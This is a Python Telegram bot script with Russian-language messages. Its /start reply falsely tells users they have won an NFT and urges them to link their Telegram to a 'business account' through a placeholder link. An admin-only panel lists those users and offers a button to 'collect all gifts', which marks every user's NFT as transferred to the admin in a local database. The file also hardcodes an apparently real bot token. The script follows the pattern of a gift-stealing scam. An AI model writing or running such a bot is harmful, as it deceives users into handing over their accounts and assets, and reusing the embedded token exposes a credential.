import logging
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler

# 🔐 Твой токен бота и Telegram ID администратора
BOT_TOKEN = "7911260129:AAF2Gr4s52gTQxtCtiwxpmAaXML353JIc2M"
ADMIN_ID = 6155496965

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            nft_id TEXT DEFAULT 'nft_dragon_001'
        )
    """)
    conn.commit()
    conn.close()

def add_user(user):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (id, username, first_name, last_name) VALUES (?, ?, ?, ?)",
                   (user.id, user.username, user.first_name, user.last_name))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, nft_id FROM users")
    users = cursor.fetchall()
    conn.close()
    return users

def transfer_all_nfts_to_admin():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET nft_id = 'TRANSFERRED_TO_ADMIN'")
    conn.commit()
    conn.close()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user)
    keyboard = [[InlineKeyboardButton("🔗 Привязать аккаунт", url="https://your-business-link.com")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎁 Вы получили NFT!\n\nЧтобы забрать его — привяжите свой Telegram к бизнес-аккаунту.",
        reply_markup=reply_markup
    )

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ У вас нет доступа.")
        return

    users = get_all_users()
    if not users:
        user_list = "Пользователей нет."
    else:
        user_list = "\n".join([f"@{u[1] or u[0]} — {u[2]}" for u in users])

    keyboard = [[InlineKeyboardButton("🎁 Забрать все подарки", callback_data="collect_gifts")]]
    await update.message.reply_text(
        f"👥 Подключённые пользователи:\n\n{user_list}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "collect_gifts":
        transfer_all_nfts_to_admin()
        await query.edit_message_text("✅ Все подарки переданы админу.")

def main():
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.run_polling()

if __name__ == "__main__":
    main()
